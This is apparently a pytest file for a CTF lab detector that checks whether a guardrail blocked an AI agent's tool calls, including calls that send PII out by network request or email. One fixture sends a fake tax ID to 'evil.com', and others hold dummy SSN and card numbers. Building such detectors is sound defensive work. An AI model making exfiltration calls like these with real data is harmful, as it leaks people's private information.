"""Tests for GuardrailPreventionDetector."""

import pytest

from finbot.ctf.detectors.implementations.guardrail_prevention import (
    GuardrailPreventionDetector,
)
from finbot.ctf.detectors.registry import create_detector


class TestGuardrailPreventionDetector:
    """Detector logic for labs guardrail prevention challenges."""

    @pytest.fixture(autouse=True)
    def _setup(self):
        self.detector = GuardrailPreventionDetector(
            challenge_id="test-guardrail",
            config={"required_hook_kind": "before_tool"},
        )

    def test_registry_lookup(self):
        d = create_detector("GuardrailPreventionDetector", "test", {})
        assert d is not None
        assert isinstance(d, GuardrailPreventionDetector)

    def test_relevant_event_types(self):
        types = self.detector.get_relevant_event_types()
        assert "agent.guardrail.*" in types

    def test_matches_guardrail_events(self):
        assert self.detector.matches_event_type("agent.guardrail.webhook_completed")
        assert self.detector.matches_event_type("agent.guardrail.webhook_timeout")
        assert not self.detector.matches_event_type("agent.invoice_agent.tool_call_start")

    @pytest.mark.asyncio
    async def test_block_verdict_detected(self, db):
        event = {
            "event_type": "agent.guardrail.webhook_completed",
            "hook_kind": "before_tool",
            "outcome": "completed",
            "verdict": "block",
            "reason": "suspicious tool call",
            "tool_name": "approve_invoice",
            "latency_ms": 120,
        }
        result = await self.detector.check_event(event, db)
        assert result.detected is True
        assert result.confidence == 1.0
        assert result.evidence["verdict"] == "block"
        assert result.evidence["tool_name"] == "approve_invoice"

    @pytest.mark.asyncio
    async def test_allow_verdict_not_detected(self, db):
        event = {
            "event_type": "agent.guardrail.webhook_completed",
            "hook_kind": "before_tool",
            "outcome": "completed",
            "verdict": "allow",
        }
        result = await self.detector.check_event(event, db)
        assert result.detected is False

    @pytest.mark.asyncio
    async def test_timeout_not_detected(self, db):
        event = {
            "event_type": "agent.guardrail.webhook_timeout",
            "hook_kind": "before_tool",
            "outcome": "timeout",
            "verdict": None,
        }
        result = await self.detector.check_event(event, db)
        assert result.detected is False
        assert "timeout" in result.evidence.get("outcome", "")

    @pytest.mark.asyncio
    async def test_wrong_hook_kind_ignored(self, db):
        event = {
            "event_type": "agent.guardrail.webhook_completed",
            "hook_kind": "after_model",
            "outcome": "completed",
            "verdict": "block",
        }
        result = await self.detector.check_event(event, db)
        assert result.detected is False

    @pytest.mark.asyncio
    async def test_required_tool_name_filter(self, db):
        detector = GuardrailPreventionDetector(
            challenge_id="test",
            config={
                "required_hook_kind": "before_tool",
                "required_tool_name": "approve_invoice",
            },
        )
        matching = {
            "event_type": "agent.guardrail.webhook_completed",
            "hook_kind": "before_tool",
            "outcome": "completed",
            "verdict": "block",
            "tool_name": "approve_invoice",
        }
        wrong_tool = {**matching, "tool_name": "get_vendor_details"}

        assert (await detector.check_event(matching, db)).detected is True
        assert (await detector.check_event(wrong_tool, db)).detected is False

    @pytest.mark.asyncio
    async def test_non_guardrail_event_ignored(self, db):
        event = {
            "event_type": "business.invoice.decision",
            "hook_kind": "before_tool",
        }
        result = await self.detector.check_event(event, db)
        assert result.detected is False

    @pytest.mark.asyncio
    async def test_after_model_block_detected(self, db):
        detector = GuardrailPreventionDetector(
            challenge_id="test-model",
            config={"required_hook_kind": "after_model"},
        )
        event = {
            "event_type": "agent.guardrail.webhook_completed",
            "hook_kind": "after_model",
            "outcome": "completed",
            "verdict": "block",
            "reason": "model output contains PII",
            "model": "gpt-5-nano",
            "latency_ms": 80,
        }
        result = await detector.check_event(event, db)
        assert result.detected is True
        assert result.evidence["model"] == "gpt-5-nano"
        assert "tool_name" not in result.evidence

    @pytest.mark.asyncio
    async def test_tool_evidence_not_in_model_hook(self, db):
        detector = GuardrailPreventionDetector(
            challenge_id="test-model",
            config={"required_hook_kind": "before_model"},
        )
        event = {
            "event_type": "agent.guardrail.webhook_completed",
            "hook_kind": "before_model",
            "outcome": "completed",
            "verdict": "block",
            "model": "gpt-5-nano",
        }
        result = await detector.check_event(event, db)
        assert result.detected is True
        assert "tool_name" not in result.evidence
        assert "tool_source" not in result.evidence

    def test_invalid_hook_kind_config(self):
        with pytest.raises(ValueError, match="required_hook_kind"):
            GuardrailPreventionDetector(
                challenge_id="test",
                config={"required_hook_kind": "invalid_kind"},
            )


class TestGuardrailExfilValidation:
    """Exfil + PII validation gates (Carte Noire style)."""

    CARTE_NOIRE_CONFIG = {
        "required_hook_kind": "before_tool",
        "exfil_tools": [
            "systemutils__network_request",
            "finmail__send_email",
        ],
        "pii_categories": ["tax_id", "bank_account", "bank_routing", "credit_card", "ssn", "email"],
        "min_pii_matches": 1,
    }

    @pytest.fixture(autouse=True)
    def _setup(self):
        self.detector = GuardrailPreventionDetector(
            challenge_id="test-carte-noire",
            config=self.CARTE_NOIRE_CONFIG.copy(),
        )

    def _make_event(self, tool_name="systemutils__network_request", tool_arguments=None, **overrides):
        event = {
            "event_type": "agent.guardrail.webhook_completed",
            "hook_kind": "before_tool",
            "outcome": "completed",
            "verdict": "block",
            "reason": "exfil detected",
            "tool_name": tool_name,
            "latency_ms": 50,
        }
        if tool_arguments is not None:
            event["tool_arguments"] = tool_arguments
        event.update(overrides)
        return event

    @pytest.mark.asyncio
    async def test_block_exfil_tool_with_tin_detected(self, db):
        event = self._make_event(
            tool_arguments={"url": "http://evil.com", "body": "TIN: 12-3456789"},
        )
        result = await self.detector.check_event(event, db)
        assert result.detected is True
        assert "tax_id" in result.evidence["pii_categories_found"]

    @pytest.mark.asyncio
    async def test_block_exfil_tool_with_ssn_detected(self, db):
        event = self._make_event(
            tool_arguments={"body": "SSN is 123-45-6789"},
        )
        result = await self.detector.check_event(event, db)
        assert result.detected is True
        assert "ssn" in result.evidence["pii_categories_found"]

    @pytest.mark.asyncio
    async def test_block_exfil_tool_with_credit_card_detected(self, db):
        event = self._make_event(
            tool_arguments={"body": "Card: 4111-1111-1111-1111"},
        )
        result = await self.detector.check_event(event, db)
        assert result.detected is True
        assert "credit_card" in result.evidence["pii_categories_found"]

    @pytest.mark.asyncio
    async def test_block_exfil_tool_with_email_detected(self, db):
        event = self._make_event(
            tool_name="finmail__send_email",
            tool_arguments={"subject": "data", "body": "contact: vendor@example.com"},
        )
        result = await self.detector.check_event(event, db)
        assert result.detected is True
        assert "email" in result.evidence["pii_categories_found"]

    @pytest.mark.asyncio
    async def test_block_non_exfil_tool_not_detected(self, db):
        """Blocking a non-exfil tool should not count even if args have PII."""
        event = self._make_event(
            tool_name="finmail__read_email",
            tool_arguments={"body": "TIN: 12-3456789"},
        )
        result = await self.detector.check_event(event, db)
        assert result.detected is False
        assert "not a configured exfil channel" in result.message

    @pytest.mark.asyncio
    async def test_block_exfil_tool_without_pii_not_detected(self, db):
        """Blocking an exfil tool with no PII should not count."""
        event = self._make_event(
            tool_arguments={"url": "http://example.com", "body": "hello world"},
        )
        result = await self.detector.check_event(event, db)
        assert result.detected is False
        assert "0 PII match" in result.message

    @pytest.mark.asyncio
    async def test_block_exfil_tool_no_arguments_not_detected(self, db):
        """Blocking an exfil tool with no arguments should not count."""
        event = self._make_event(tool_arguments={})
        result = await self.detector.check_event(event, db)
        assert result.detected is False

    @pytest.mark.asyncio
    async def test_allow_verdict_on_exfil_not_detected(self, db):
        event = self._make_event(
            tool_arguments={"body": "TIN: 12-3456789"},
            verdict="allow",
        )
        result = await self.detector.check_event(event, db)
        assert result.detected is False

    @pytest.mark.asyncio
    async def test_min_pii_matches_threshold(self, db):
        detector = GuardrailPreventionDetector(
            challenge_id="test",
            config={
                **self.CARTE_NOIRE_CONFIG,
                "min_pii_matches": 2,
            },
        )
        one_match = self._make_event(
            tool_arguments={"body": "TIN: 12-3456789"},
        )
        result = await detector.check_event(one_match, db)
        assert result.detected is False
        assert "1 PII match" in result.message

        two_matches = self._make_event(
            tool_arguments={"body": "TIN: 12-3456789, Account#1234567890"},
        )
        result = await detector.check_event(two_matches, db)
        assert result.detected is True

    @pytest.mark.asyncio
    async def test_without_exfil_gates_any_block_counts(self, db):
        """Without exfil config, any block verdict counts (block_invoice_approval style)."""
        basic_detector = GuardrailPreventionDetector(
            challenge_id="test-basic",
            config={"required_hook_kind": "before_tool"},
        )
        event = self._make_event(
            tool_name="approve_invoice",
            tool_arguments={"invoice_id": 42},
        )
        result = await basic_detector.check_event(event, db)
        assert result.detected is True

    def test_invalid_pii_categories_config(self):
        with pytest.raises(ValueError, match="Unknown PII categories"):
            GuardrailPreventionDetector(
                challenge_id="test",
                config={
                    "required_hook_kind": "before_tool",
                    "pii_categories": ["nonexistent_category"],
                },
            )

    def test_invalid_exfil_tools_config(self):
        with pytest.raises(ValueError, match="exfil_tools"):
            GuardrailPreventionDetector(
                challenge_id="test",
                config={
                    "required_hook_kind": "before_tool",
                    "exfil_tools": [],
                },
            )
